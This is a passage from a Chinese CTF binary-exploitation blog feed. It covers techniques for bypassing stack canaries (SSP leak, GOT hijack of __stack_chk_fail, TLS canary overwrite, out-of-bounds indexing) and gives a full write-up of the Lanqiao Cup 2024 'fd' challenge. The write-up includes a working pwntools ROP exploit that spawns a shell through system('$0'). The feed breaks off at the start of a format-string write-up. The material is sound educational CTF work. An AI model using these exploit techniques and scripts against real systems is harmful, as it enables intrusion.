class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>逻辑很清晰，<code>__stack_chk_fail</code> 函数会调用 <code>__fortify_fail</code> 函数输出刚刚的 <code>*** stack smashing detected ***: terminated</code> 信息</p><p>但是细心一点会发现，这里存在两个 <code>&#39;%s&#39;</code>，后面还有个 <code>__libc_argv[0]</code> 参数，因此<em>实际上是输出了 <code>msg</code> 和 <code>__libc_argv[0]</code> 两个参数的内容</em></p><blockquote><p><code>msg</code> 是固定的 <code>&quot;stack smashing detected&quot;</code>，<code>__libc_argv[0]</code> 默认为程序名</p></blockquote><p>因此，如果我们能修改 <code>__libc_argv[0]</code> 的值为某个地址，就可以将该地址上的信息在 <code>&quot;*** %s ***: %s terminated\n&quot;</code> 中输出出来</p><p>从 Glibc 2.26 开始，增加了一个 <code>need_backtrace</code> 变量来控制输出的信息，这时 <code>__libc_argv[0]</code> 默认为 <code>&lt;unknown&gt;</code>，源码如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// ./glibc-2.26/debug/fortify_fail.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdbool.h></span></span><span class="token keyword">extern</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>__libc_argv attribute_hidden<span class="token punctuation">;</span><span class="token keyword">void</span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> internal_function<span class="token function">__fortify_fail_abort</span> <span class="token punctuation">(</span><span class="token keyword">_Bool</span> need_backtrace<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">/* The loop is added only to keep gcc happy.  Don't pass down     __libc_argv[0] if we aren't doing backtrace since __libc_argv[0]     may point to the corrupted stack.  */</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token function">__libc_message</span> <span class="token punctuation">(</span>need_backtrace <span class="token operator">?</span> <span class="token punctuation">(</span>do_abort <span class="token operator">|</span> do_backtrace<span class="token punctuation">)</span> <span class="token operator">:</span> do_abort<span class="token punctuation">,</span>    <span class="token string">"*** %s ***: %s terminated\n"</span><span class="token punctuation">,</span>    msg<span class="token punctuation">,</span>    <span class="token punctuation">(</span>need_backtrace <span class="token operator">&amp;&amp;</span> __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span>     <span class="token operator">?</span> __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token string">"&lt;unknown>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> internal_function<span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">__fortify_fail_abort</span> <span class="token punctuation">(</span>true<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>__fortify_fail<span class="token punctuation">)</span><span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>__fortify_fail_abort<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>但是，Ubuntu 22.04 使用的是 Glibc 2.35，在该 Glibc 版本中不存在 <code>__libc_argv[0]</code> 参数了，源码如下：</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// ./glibc-2.35/debug/stack_chk_fail.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">__stack_chk_fail</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token string">"stack smashing detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">strong_alias</span> <span class="token punctuation">(</span>__stack_chk_fail<span class="token punctuation">,</span> __stack_chk_fail_local<span class="token punctuation">)</span><span class="token comment">// ./glibc-2.35/debug/fortify_fail.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">/* The loop is added only to keep gcc happy.  */</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token function">__libc_message</span> <span class="token punctuation">(</span>do_abort<span class="token punctuation">,</span> <span class="token string">"*** %s ***: terminated\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>__fortify_fail<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><em>因此如果想在 Ubuntu 22.04 或较新版本 Glibc 的机器上进行本地测试，需要更换 Glibc 版本，建议 Glibc 2.25 以下版本</em></p></blockquote><p>对于 <code>__libc_argv[0]</code> 的地址，在 GDB 中可以直接查看：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp12.png" alt="华为杯2023-ez_ssp12.png"></p><p>另外，还需要了解一个重要函数 <code>environ</code></p><p><code>environ</code> 存在于 libc 中，是一个全局变量，储存着系统的环境变量，因此 <code>environ</code> 是连接 libc 地址与栈地址的桥梁</p><p>系统的环境变量在程序的栈中长这样：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp15.png" alt="华为杯2023-ez_ssp15.png"></p><blockquote><p>通过 libc 偏移计算得到 <code>environ</code> 的真实地址后，泄露 <code>environ</code> 的真实地址处存放的值，就可以得到保存在栈中的环境变量的真实地址</p><p>通过环境变量的首地址与栈上其他位置的偏移，我们就可以得到栈上任意变量的地址</p><p><em>配合 SSP Leak，虽然我们不能直接获得 shell，但是可以实现栈上的任意地址读</em></p></blockquote><p>具体例题见本站的《<a href="%E3%80%90%E5%8D%8E%E4%B8%BA%E6%9D%AF%202023%E3%80%91ez_ssp.md">【华为杯 2023】ez_ssp</a>》</p><hr><h2 id="劫持-stack-chk-fail-绕过-Canary"><a href="#劫持-stack-chk-fail-绕过-Canary" class="headerlink" title="劫持 __stack_chk_fail 绕过 Canary"></a>劫持 <code>__stack_chk_fail</code> 绕过 Canary</h2><blockquote><p>Canary 的机制就是检测到溢出后执行 <code>__stack_chk_fail</code> 函数是程序崩溃，因此如果我们可以劫持 <code>__stack_chk_fail</code> 函数，例如将 <code>__stack_chk_fail</code> 函数的 GOT 表地址改为后门函数的地址，那么触发 Canary 后就会执行后门函数了</p><p>使用条件：<br><mark>需要存在格式化字符串漏洞</mark></p></blockquote><p>具体例题见本站的《<a href="%E3%80%90BJDCTF%202nd%E3%80%91r2t4.md">【BJDCTF 2nd】r2t4</a>》</p><hr><h2 id="修改-TLS-结构体控制-Canary"><a href="#修改-TLS-结构体控制-Canary" class="headerlink" title="修改 TLS 结构体控制 Canary"></a>修改 TLS 结构体控制 Canary</h2><blockquote><p>TLS 全称为 Thread Local Storage，是一种线程私有的数据存储方式，每个线程都有自己的局部存储空间，可以在其中存储线程私有的数据</p><p>因为 Canary 会被储存在 TLS 中，在函数返回前会使用这个值进行对比，如果溢出的长度足够大，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过</p><p>使用条件：<br><mark>1. 溢出字节够大，通常至少一个 page（4K）</mark><br><mark>2. 创建一个线程，在线程内栈溢出</mark></p></blockquote><p>在 64 位程序中，TLS 由 FS 寄存器指向，通常为 <code>FS:28h</code></p><p>在 32 位程序中，TLS 由 GS 寄存器指向，通常为 <code>GS:14h</code></p><p>TLS 在 Glibc 中的实现为 <code>tcbhead_t(TCB)</code> 结构体，其中 <code>stack_guard</code> 变量存储的值就是 Canary，其结构体定义如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>tcb<span class="token punctuation">;</span>                <span class="token comment">/* Pointer to the TCB.  Not necessarily the                           thread descriptor used by libpthread.  */</span>  <span class="token class-name">dtv_t</span> <span class="token operator">*</span>dtv<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>self<span class="token punctuation">;</span>                <span class="token comment">/* Pointer to the thread descriptor.  */</span>  <span class="token keyword">int</span> multiple_threads<span class="token punctuation">;</span>  <span class="token keyword">int</span> gscope_flag<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> sysinfo<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> stack_guard<span class="token punctuation">;</span>    <span class="token comment">// 储存 Canary 的值</span>  <span class="token class-name">uintptr_t</span> pointer_guard<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">int</span> vgetcpu_cache<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">/* Bit 0: X86_FEATURE_1_IBT.     Bit 1: X86_FEATURE_1_SHSTK.   */</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> feature_1<span class="token punctuation">;</span>  <span class="token keyword">int</span> __glibc_unused1<span class="token punctuation">;</span>  <span class="token comment">/* Reservation of some values for the TM ABI.  */</span>  <span class="token keyword">void</span> <span class="token operator">*</span>__private_tm<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">/* GCC split stack support.  */</span>  <span class="token keyword">void</span> <span class="token operator">*</span>__private_ss<span class="token punctuation">;</span>  <span class="token comment">/* The lowest address of shadow stack,  */</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> ssp_base<span class="token punctuation">;</span>  <span class="token comment">/* Must be kept even if it is no longer used by glibc since programs,     like AddressSanitizer, depend on the size of tcbhead_t.  */</span>  __128bits __glibc_unused2<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span> <span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>__padding<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token class-name">tcbhead_t</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成随机数 Canary 的位置：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">uintptr_t</span> stack_chk_guard <span class="token operator">=</span> <span class="token function">_dl_setup_stack_chk_guard</span><span class="token punctuation">(</span>_dl_random<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>当程序创建线程的时候，会顺便创建一个 TLS 用来存储线程私有的数据，该 TLS 也会存储 Canary 的值，而 TLS 会保存在栈的高地址处 <strong>（这也是为什么说同一个进程中的不同线程的 Canary 是相同的）</strong></p></blockquote><p>因此，我们只要覆盖 TLS 中 Canary 的值，那么整个程序的 Canary 的值就是由我们来定的了</p><p>在子线程中可以通过如下指令查看 TLS 在栈上的首地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> x/x pthread_self<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack10.png" alt="【starctf2018】babystack10.png"></p><blockquote><p>在 64 位程序中，Canary 与 TLS 首地址偏移 28h</p><p>在 32 位程序中，Canary 与 TLS 首地址偏移 14h</p></blockquote><p>具体例题见本站的《<a href="%E3%80%90Star%20Ctf%202018%E3%80%91babystack.md">【Star Ctf 2018】babystack</a>》</p><hr><h2 id="数组下标越界绕过-Canary"><a href="#数组下标越界绕过-Canary" class="headerlink" title="数组下标越界绕过 Canary"></a>数组下标越界绕过 Canary</h2><blockquote><p>当程序中存在数组，并且没有对数组的边界进行检查时，可以通过使数组的下标越界来直接修改返回地址，从而绕过 Canary</p><p>使用条件：<br><mark>程序的栈中存在数组</mark></p></blockquote><p>假设栈中的结构如下图：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack15.png" alt="【starctf2018】babystack15.png"></p><p>其中 <code>arr[]</code> 是一个长度为 4 的数组，正常来说，数组元素只有 <code>arr[0] ~ arr[3]</code></p><p>由于数组本身也是利用指针寻址的，例如 <code>uint_32</code> 型的数组 <code>a[]</code> 中，<code>a[i]</code> 与 <code>*(a + i * 4)</code> 本质上是一样的</p><p>因此如果没有对数组的边界进行检查，那么上图中的 <code>arry[7]</code> 就代表栈上的返回地址了，即使 <code>arry[7]</code> 在数组 <code>arry[]</code> 中下标越界</p><p>具体例题见本站的《<a href="%E3%80%90wustctf%202020%E3%80%91name_your_cat.md">【wustctf 2020】name_your_cat</a>》</p><hr><h2 id="C-异常机制绕过-Canary"><a href="#C-异常机制绕过-Canary" class="headerlink" title="C++ 异常机制绕过 Canary"></a>C++ 异常机制绕过 Canary</h2><p>参考文章：<a href="https://www.anquanke.com/post/id/89855%E3%80%91">Shanghai-DCTF-2017 线下攻防Pwn题 - 安全客，安全资讯平台</a></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【蓝桥杯 2024】fd</title>
      <link href="/posts/7895a21b.html"/>
      <url>/posts/7895a21b.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>利用 <code>system(&quot;$0&quot;)</code> 这种不常见的方式获取 shell</p></li><li><p>利用 <code>exec 1&gt;&amp;2</code> 重定向绕过 <code>close(1)</code></p></li></ul><hr><p><a href="https://match.ichunqiu.com/without">（2024年4月27日）【蓝桥杯2024】fd</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>分析程序保护：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd1.png" alt="PWN-蓝桥杯2024_fd1.png"></p><p>IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd2.png" alt="PWN-蓝桥杯2024_fd2.png"></p><p>程序逻辑是比较简单的，首先向 <code>info</code> 所在地址输入 0xE 的长度</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd5.png" alt="PWN-蓝桥杯2024_fd5.png"></p><p><code>info</code> 位于 BSS 段上</p><p>然后 <code>buf</code> 处存在明显溢出：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd6.png" alt="PWN-蓝桥杯2024_fd6.png"></p><p>并且程序中存在 <code>system()</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd7.png" alt="PWN-蓝桥杯2024_fd7.png"></p><p>但没有 <code>&quot;/bin/sh&quot;</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd8.png" alt="PWN-蓝桥杯2024_fd8.png"></p><p>因此，很自然地想到通过 <code>info</code> 往 BSS 段写入 <code>&quot;/bin/sh&quot;</code> 然后溢出 <code>buf</code> 构造 <code>system(&quot;/bin/sh&quot;)</code></p><p>但如果真是这样，就没必要有这篇文章了哈哈哈</p><p>因为发现在输入 <code>buf</code> 后会执行一个 <code>check()</code> 函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd3.png" alt="PWN-蓝桥杯2024_fd3.png"></p><p>这里会检测我们输入到 <code>info</code> 处的数据，不能包含 <code>&#39;b&#39;</code>、<code>&#39;i&#39;</code>、<code>&#39;n&#39;</code>、<code>&#39;/&#39;</code>、<code>&#39;s&#39;</code></p><p>同时也不能存在连续三个字符为 <code>&quot;cat&quot;</code></p><p>因此，我们构造 <code>system(&quot;/bin/sh&quot;)</code>、<code>system(&quot;sh&quot;)</code>、<code>system(&quot;cat flag&quot;)</code> 都是行不通的</p><p>所以这里要用到一个比较少见的获取 shell 的方式：<code>system(&quot;$0&quot;)</code></p><blockquote><p><code>$0</code> 是 Linux shell 中的一个环境变量，指的是 shell 本身的文件名，因此 <code>system(&quot;$0&quot;)</code> 的功能等价于 <code>system(&quot;/bin/sh&quot;)</code></p><p>另外，还有 <code>$1</code> 和 <code>$2</code> 等：</p><p><code>$1</code> 是传递给该 shell 脚本的第一个参数</p><p><code>$2</code> 是传递给该 shell 脚本的第二个参数</p></blockquote><p>但这样也还没有结束，因为即使我们绕过了检测，这个函数的返回值是 <code>close(1)</code></p><p>先来看看 <code>close()</code> 是个什么函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd4.png" alt="PWN-蓝桥杯2024_fd4.png"></p><p>这里的 <code>fd</code> 明显是文件描述符，也就是关闭了文件描述符 1 的功能</p><blockquote><p>Linux 下的三种文件描述符：</p><p><code>fd = 0</code>：标准输入文件 <code>stdin</code><br><code>fd = 1</code>：标准输出文件 <code>stdout</code><br><code>fd = 2</code>：标准错误输出文件 <code>stderr</code></p></blockquote><p>因此这里是关闭了标准输出的功能</p><p>在获取 shell 后的表现是这样的：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd9.png" alt="PWN-蓝桥杯2024_fd9.png"></p><p>可以看到，我们已经通过构造 <code>system(&quot;$0&quot;)</code> 获取了 shell，但是 <code>ls</code>、<code>cat</code> 等指令是无法使用的</p><p>因为这些指令都需要使用到 Linux 的标准输出，也就是 <code>fd = 1</code>，而这里使用 <code>close(1)</code> 关闭了标准输出</p><p>但是可以通过重定向来绕过，使用如下命令实现重定向：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token file-descriptor important">&amp;2</span>   <span class="token comment"># 也可以简写为：exec >&amp;2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd10.png" alt="PWN-蓝桥杯2024_fd10.png"></p><p>当然，我们也可以不使用 <code>exec 1&gt;&amp;2</code>，而是直接执行指令，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">whoami</span> <span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token file-descriptor important">&amp;2</span>   <span class="token comment"># 也可以简写为：whoami >&amp;2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd11.png" alt="PWN-蓝桥杯2024_fd11.png"></p><blockquote><p>一些重定向的知识：</p><p><code>1&gt;&amp;2</code>：把标准输出重定向到标准错误<br><code>2&gt;&amp;1</code>：把标准错误输出重定向到标准输出<br><code>&amp;&gt;filename</code>：把标准输出和标准错误输出都重定向到文件 filename 中</p><p>例如常见的重定向：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"xxx"</span> <span class="token operator">></span> filename.txt <span class="token comment"># 把 "xxx" 写入到 filename.txt 文件中</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment"># 远程程序的 IP 和端口号</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"47.93.142.240"</span><span class="token punctuation">,</span> <span class="token number">44180</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"restricted stack.\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'$0\x00'</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>info_addr <span class="token operator">=</span> <span class="token number">0x601090</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400933</span>ret <span class="token operator">=</span> <span class="token number">0x4005ae</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system_plt --->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>info_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment"># debug()</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd12.png" alt="PWN-蓝桥杯2024_fd12.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【你想有多PWN】fmt_test2</title>
      <link href="/posts/ba83bd5d.html"/>
      <url>/posts/ba83bd5d.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>利用格式化字符串泄露栈中的数据，判断输入的数据位于栈空间的哪个位置</p></li><li><p><mark>在程序开启 PIE 时，利用格式化字符串漏洞泄露栈上的真实返回地址，然后根据 ELF 文件中函数的偏移推算出其他函数的真实地址</mark></p></li><li><p>根据已经泄露的真实地址，利用 libc 偏移计算 <code>system()</code> 和 <code>b&#39;/bin/sh&#39;</code> 的地址</p></li><li><p>使用 Pwntools 中的 <code>fmtstr_payload()</code> 构造格式化字符串的利用，将 <code>printf()</code> 的 GOT 表地址修改为 <code>system_plt</code></p></li><li><p><mark>注意 32 位程序与 64 位程序在使用 <code>%参数顺序$格式化说明符</code> 进行地址泄露时的区别</mark></p></li></ul><hr><h1 id="fmt-str-level-1-x86"><a href="#fmt-str-level-1-x86" class="headerlink" title="fmt_str_level_1_x86"></a>fmt_str_level_1_x86</h1><p>源代码如下：（这里 gcc 编译时使用 <code>-z lazy</code> 来实现 Partial RELRO）</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> <span class="token function">init_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token 